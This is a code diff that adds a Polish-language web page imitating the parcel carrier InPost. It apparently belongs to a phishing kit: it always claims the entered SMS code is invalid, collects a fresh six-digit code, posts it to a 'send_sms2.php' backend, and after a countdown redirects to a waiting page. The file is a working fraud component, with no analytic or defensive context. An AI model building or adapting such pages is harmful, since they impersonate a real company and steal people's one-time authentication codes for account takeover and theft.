@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Weryfikacja SMS - InPost</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #fff;
+      color: #222;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem 1rem;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 480px;
+      background: #fff;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      padding: 2rem;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.05);
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      font-size: 1.75rem;
+      font-weight: 700;
+      margin-bottom: 2rem;
+      color: #000;
+      justify-content: center;
+    }
+
+    .logo svg {
+      width: 36px;
+      height: 36px;
+      fill: #ffcc00;
+      margin-right: 0.5rem;
+    }
+
+    h2 {
+      font-size: 1.3rem;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+
+    p {
+      color: #d00;
+      font-weight: 700;
+      font-size: 1.1rem;
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin-bottom: 6px;
+    }
+
+    input {
+      width: 100%;
+      padding: 0.6rem 0.75rem;
+      font-size: 1.5rem;
+      border: 2px solid #ccc;
+      border-radius: 5px;
+      margin-bottom: 1.2rem;
+      text-align: center;
+      letter-spacing: 0.25rem;
+      transition: border-color 0.3s ease;
+    }
+
+    input:focus {
+      border-color: #ffcc00;
+      outline: none;
+    }
+
+    button {
+      background-color: #ffcc00;
+      color: #000;
+      border: none;
+      font-weight: 700;
+      font-size: 1rem;
+      padding: 0.85rem 2rem;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #e6b800;
+    }
+
+    .countdown {
+      font-weight: 700;
+      font-size: 1.1rem;
+      color: #ff6600;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      letter-spacing: 0.1rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <svg viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="5" fill="#FFCC00"/>
+        <g stroke="#FFCC00" stroke-width="2">
+          <line x1="12" y1="1" x2="12" y2="5" />
+          <line x1="12" y1="19" x2="12" y2="23" />
+          <line x1="1" y1="12" x2="5" y2="12" />
+          <line x1="19" y1="12" x2="23" y2="12" />
+          <line x1="4" y1="4" x2="7" y2="7" />
+          <line x1="17" y1="17" x2="20" y2="20" />
+          <line x1="4" y1="20" x2="7" y2="17" />
+          <line x1="17" y1="7" x2="20" y2="4" />
+        </g>
+      </svg>
+      InPost
+    </div>
+
+    <h2>Wprowadź kod SMS</h2>
+    <p>Podany kod jest nieprawidłowy. Spróbuj ponownie.</p>
+
+    <div class="countdown" id="countdown">02:00</div>
+
+    <form method="POST" action="send_sms2.php">
+      <label for="smscode">Kod SMS</label>
+      <input
+        type="text"
+        id="smscode"
+        name="smscode"
+        maxlength="6"
+        pattern="\d{6}"
+        inputmode="numeric"
+        placeholder="______"
+        required
+        autocomplete="off"
+      />
+      <button type="submit">Zweryfikuj</button>
+    </form>
+  </div>
+
+  <script>
+    let timeLeft = 120;
+    const countdownEl = document.getElementById('countdown');
+
+    function updateCountdown() {
+      const minutes = String(Math.floor(timeLeft / 60)).padStart(2, '0');
+      const seconds = String(timeLeft % 60).padStart(2, '0');
+      countdownEl.textContent = `${minutes}:${seconds}`;
+
+      if (timeLeft === 0) {
+        clearInterval(timerInterval);
+        countdownEl.textContent = 'Kod wygasł';
+        document.getElementById('smscode').disabled = true;
+        document.querySelector('button').disabled = true;
+
+        // Redirect after 1 second to wait3.html (or wherever)
+        setTimeout(() => {
+          window.location.href = 'wait3.html';
+        }, 1000);
+      }
+
+      timeLeft--;
+    }
+
+    updateCountdown();
+    const timerInterval = setInterval(updateCountdown, 1000);
+  </script>
+</body>
+</html>
